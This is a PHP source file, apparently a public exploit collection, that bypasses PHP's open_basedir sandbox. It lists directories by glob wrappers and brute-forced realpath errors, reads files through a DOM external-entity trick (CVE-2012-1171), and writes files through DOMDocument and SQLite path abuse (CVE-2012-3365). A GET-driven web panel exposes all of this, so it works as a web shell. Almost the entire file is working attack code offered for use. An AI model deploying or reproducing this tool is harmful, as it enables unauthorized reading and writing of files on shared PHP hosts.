<?php
/*
PHP open_basedir bypass collection
Works with >= PHP5
By /fd, @filedescriptor(https://twitter.com/filedescriptor)
 */

// Assistant functions
function getRelativePath($from, $to) {
	// some compatibility fixes for Windows paths
	$from = rtrim($from, '\/') . '/';
	$from = str_replace('\\', '/', $from);
	$to = str_replace('\\', '/', $to);

	$from = explode('/', $from);
	$to = explode('/', $to);
	$relPath = $to;

	foreach ($from as $depth => $dir) {
		// find first non-matching dir
		if ($dir === $to[$depth]) {
			// ignore this directory
			array_shift($relPath);
		} else {
			// get number of remaining dirs to $from
			$remaining = count($from) - $depth;
			if ($remaining > 1) {
				// add traversals up to first matching dir
				$padLength = (count($relPath) + $remaining - 1) * -1;
				$relPath = array_pad($relPath, $padLength, '..');
				break;
			} else {
				$relPath[0] = './' . $relPath[0];
			}
		}
	}
	return implode('/', $relPath);
}

function fallback($classes) {
	foreach ($classes as $class) {
		$object = new $class;
		if ($object->isAvailable()) {
			return $object;
		}
	}
	return new NoExploit;
}

// Core classes
interface Exploitable {
	function isAvailable();
	function getDescription();
}

class NoExploit implements Exploitable {
	function isAvailable() {
		return true;
	}
	function getDescription() {
		return 'No exploit is available.';
	}
}

abstract class DirectoryLister implements Exploitable {
	var $currentPath;

	function isAvailable() {}
	function getDescription() {}
	function getFileList() {}
	function setCurrentPath($currentPath) {
		$this->currentPath = $currentPath;
	}
	function getCurrentPath() {
		return $this->currentPath;
	}
}

class GlobWrapperDirectoryLister extends DirectoryLister {
	function isAvailable() {
		return stripos(PHP_OS, 'win') === FALSE && in_array('glob', stream_get_wrappers());
	}
	function getDescription() {
		return 'Directory listing via glob pattern';
	}
	function getFileList() {
		$file_list = array();
		// normal files
		$it = new DirectoryIterator("glob://{$this->getCurrentPath()}*");
		foreach ($it as $f) {
			$file_list[] = $f->__toString();
		}
		// special files (starting with a dot(.))
		$it = new DirectoryIterator("glob://{$this->getCurrentPath()}.*");
		foreach ($it as $f) {
			$file_list[] = $f->__toString();
		}
		sort($file_list);
		return $file_list;
	}
}

class RealpathBruteForceDirectoryLister extends DirectoryLister {
	var $characters = 'abcdefghijklmnopqrstuvwxyz0123456789-_'
	, $extension = array()
	, $charactersLength = 38
	, $maxlength = 3
	, $fileList = array();

	function isAvailable() {
		return ini_get('open_basedir') && function_exists('realpath');
	}
	function getDescription() {
		return 'Directory listing via brute force searching with realpath function.';
	}
	function setCharacters($characters) {
		$this->characters = $characters;
		$this->charactersLength = count($characters);
	}
	function setExtension($extension) {
		$this->extension = $extension;
	}
	function setMaxlength($maxlength) {
		$this->maxlength = $maxlength;
	}
	function getFileList() {
		set_time_limit(0);
		set_error_handler(array(__CLASS__, 'handler'));
		$number_set = array();
		while (count($number_set = $this->nextCombination($number_set, 0)) <= $this->maxlength) {
			$this->searchFile($number_set);
		}
		sort($this->fileList);
		return $this->fileList;
	}
	function nextCombination($number_set, $length) {
		if (!isset($number_set[$length])) {
			$number_set[$length] = 0;
			return $number_set;
		}
		if ($number_set[$length] + 1 === $this->charactersLength) {
			$number_set[$length] = 0;
			$number_set = $this->nextCombination($number_set, $length + 1);
		} else {
			$number_set[$length]++;
		}
		return $number_set;
	}
	function searchFile($number_set) {
		$file_name = 'a';
		foreach ($number_set as $key => $value) {
			$file_name[$key] = $this->characters[$value];
		}
		// normal files
		realpath($this->getCurrentPath() . $file_name);
		// files with preceeding dot
		realpath($this->getCurrentPath() . '.' . $file_name);
		// files with extension
		foreach ($this->extension as $extension) {
			realpath($this->getCurrentPath() . $file_name . $extension);
		}
	}
	function handler($errno, $errstr, $errfile, $errline) {
		$regexp = '/File\((.*)\) is not within/';
		preg_match($regexp, $errstr, $matches);
		if (isset($matches[1])) {
			$this->fileList[] = $matches[1];
		}

	}
}

abstract class FileWriter implements Exploitable {
	var $filePath;

	function isAvailable() {}
	function getDescription() {}
	function write($content) {}
	function setFilePath($filePath) {
		$this->filePath = $filePath;
	}
	function getFilePath() {
		return $this->filePath;
	}
}

abstract class FileReader implements Exploitable {
	var $filePath;

	function isAvailable() {}
	function getDescription() {}
	function read() {}
	function setFilePath($filePath) {
		$this->filePath = $filePath;
	}
	function getFilePath() {
		return $this->filePath;
	}
}

// Assistant class for DOMFileWriter & DOMFileReader
class StreamExploiter {
	var $mode, $filePath, $fileContent;

	function stream_close() {
		$doc = new DOMDocument;
		$doc->strictErrorChecking = false;
		switch ($this->mode) {
		case 'w':
			$doc->loadHTML($this->fileContent);
			$doc->removeChild($doc->firstChild);
			$doc->saveHTMLFile($this->filePath);
			break;
		default:
		case 'r':
			$doc->resolveExternals = true;
			$doc->substituteEntities = true;
			$doc->loadXML("<!DOCTYPE doc [<!ENTITY file SYSTEM \"file://{$this->filePath}\">]><doc>&file;</doc>", LIBXML_PARSEHUGE);
			echo $doc->documentElement->firstChild->nodeValue;
		}
	}
	function stream_open($path, $mode, $options, &$opened_path) {
		$this->filePath = substr($path, 10);
		$this->mode = $mode;
		return true;
	}
	public function stream_write($data) {
		$this->fileContent = $data;
		return strlen($data);
	}
}

class DOMFileWriter extends FileWriter {
	function isAvailable() {
		return extension_loaded('dom') && (version_compare(phpversion(), '5.3.10', '<=') || version_compare(phpversion(), '5.4.0', '='));
	}
	function getDescription() {
		return 'Write to and create a file exploiting CVE-2012-1171 (allow overriding). Notice the content should be in well-formed XML format.';
	}
	function write($content) {
		// set it to global resource in order to trigger RSHUTDOWN
		global $_DOM_exploit_resource;
		stream_wrapper_register('exploit', 'StreamExploiter');
		$_DOM_exploit_resource = fopen("exploit://{$this->getFilePath()}", 'w');
		fwrite($_DOM_exploit_resource, $content);
	}
}

class DOMFileReader extends FileReader {
	function isAvailable() {
		return extension_loaded('dom') && (version_compare(phpversion(), '5.3.10', '<=') || version_compare(phpversion(), '5.4.0', '='));
	}
	function getDescription() {
		return 'Read a file exploiting CVE-2012-1171. Notice the content should be in well-formed XML format.';
	}
	function read() {
		// set it to global resource in order to trigger RSHUTDOWN
		global $_DOM_exploit_resource;
		stream_wrapper_register('exploit', 'StreamExploiter');
		$_DOM_exploit_resource = fopen("exploit://{$this->getFilePath()}", 'r');
	}
}

class SqliteFileWriter extends FileWriter {
	function isAvailable() {
		return is_writable(getcwd())
			&& (extension_loaded('sqlite3') || extension_loaded('sqlite'))
			&& (version_compare(phpversion(), '5.3.15', '<=') || (version_compare(phpversion(), '5.4.5', '<=') && PHP_MINOR_VERSION == 4));
	}
	function getDescription() {
		return 'Create a file with custom content exploiting CVE-2012-3365 (disallow overriding). Junk contents may be inserted';
	}
	function write($content) {
		$sqlite_class = extension_loaded('sqlite3') ? 'sqlite3' : 'SQLiteDatabase';
		mkdir(':memory:');
		$payload_path = getRelativePath(getcwd() . '/:memory:', $this->getFilePath());
		$payload = str_replace('\'', '\'\'', $content);
		$database = new $sqlite_class(":memory:/{$payload_path}");
		$database->exec("CREATE TABLE foo (bar STRING)");
		$database->exec("INSERT INTO foo (bar) VALUES ('{$payload}')");
		$database->close();
		rmdir(':memory:');
	}
}

// End of Core
?>
<?php
$action = isset($_GET['action']) ? $_GET['action'] : '';
$cwd = isset($_GET['cwd']) ? $_GET['cwd'] : getcwd();
$cwd = rtrim($cwd, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;
$directorLister = fallback(array('GlobWrapperDirectoryLister', 'RealpathBruteForceDirectoryLister'));
$fileWriter = fallback(array('DOMFileWriter', 'SqliteFileWriter'));
$fileReader = fallback(array('DOMFileReader'));
$append = '';
?>
<style>
#panel {
  height: 200px;
  overflow: hidden;
}
#panel > pre {
  margin: 0;
  height: 200px;
}
</style>
<div id="panel">
<pre id="dl">
open_basedir: <span style="color: red"><?php echo ini_get('open_basedir') ? ini_get('open_basedir') : 'Off'; ?></span>
<form style="display:inline-block" action="">
<fieldset><legend>Directory Listing:</legend>Current Directory: <input name="cwd" size="100" value="<?php echo $cwd; ?>"><input type="submit" value="Go">
<?php if (get_class($directorLister) === 'RealpathBruteForceDirectoryLister'): ?>
<?php
$characters = isset($_GET['characters']) ? $_GET['characters'] : $directorLister->characters;
$maxlength = isset($_GET['maxlength']) ? $_GET['maxlength'] : $directorLister->maxlength;
$append = "&characters={$characters}&maxlength={$maxlength}";

$directorLister->setMaxlength($maxlength);
?>
Search Characters: <input name="characters" size="100" value="<?php echo $characters; ?>">
Maxlength of File: <input name="maxlength" size="1" value="<?php echo $maxlength; ?>">
<?php endif;?>
Description      : <strong><?php echo $directorLister->getDescription(); ?></strong>
</fieldset>
</form>
</pre>
<?php
$file_path = isset($_GET['file_path']) ? $_GET['file_path'] : '';
?>
<pre id="rf">
open_basedir: <span style="color: red"><?php echo ini_get('open_basedir') ? ini_get('open_basedir') : 'Off'; ?></span>
<form style="display:inline-block" action="">
<fieldset><legend>Read File :</legend>File Path: <input name="file_path" size="100" value="<?php echo $file_path; ?>"><input type="submit" value="Read">
Description: <strong><?php echo $fileReader->getDescription(); ?></strong><input type="hidden" name="action" value="rf">
</fieldset>
</form>
</pre>
<pre id="wf">
open_basedir: <span style="color: red"><?php echo ini_get('open_basedir') ? ini_get('open_basedir') : 'Off'; ?></span>
<form style="display:inline-block" action="">
<fieldset><legend>Write File :</legend>File Path   : <input name="file_path" size="100" value="<?php echo $file_path; ?>"><input type="submit" value="Write">
File Content: <textarea cols="70" name="content"></textarea>
Description : <strong><?php echo $fileWriter->getDescription(); ?></strong><input type="hidden" name="action" value="wf">
</fieldset>
</form>
</pre>
</div>
<a href="#dl">Directory Listing</a> | <a href="#rf">Read File</a> | <a href="#wf">Write File</a>
<hr>
<pre>
<?php if ($action === 'rf'): ?>
<plaintext>
<?php
$fileReader->setFilePath($file_path);
echo $fileReader->read();
?>
<?php elseif ($action === 'wf'): ?>
<?php
if (isset($_GET['content'])) {
	$fileWriter->setFilePath($file_path);
	$fileWriter->write($_GET['content']);
	echo 'The file should be written.';
} else {
	echo 'Something goes wrong.';
}
?>
<?php else: ?>
<ol>
<?php
$directorLister->setCurrentPath($cwd);
$file_list = $directorLister->getFileList();
$parent_path = dirname($cwd);

echo "<li><a href='?cwd={$parent_path}{$append}#dl'>Parent</a></li>";
if (count($file_list) > 0) {
	foreach ($file_list as $file) {
		echo "<li><a href='?cwd={$cwd}{$file}{$append}#dl'>{$file}</a></li>";
	}
} else {
	echo 'No files found. The path is probably not a directory.';
}
?>
</ol>
<?php endif;?>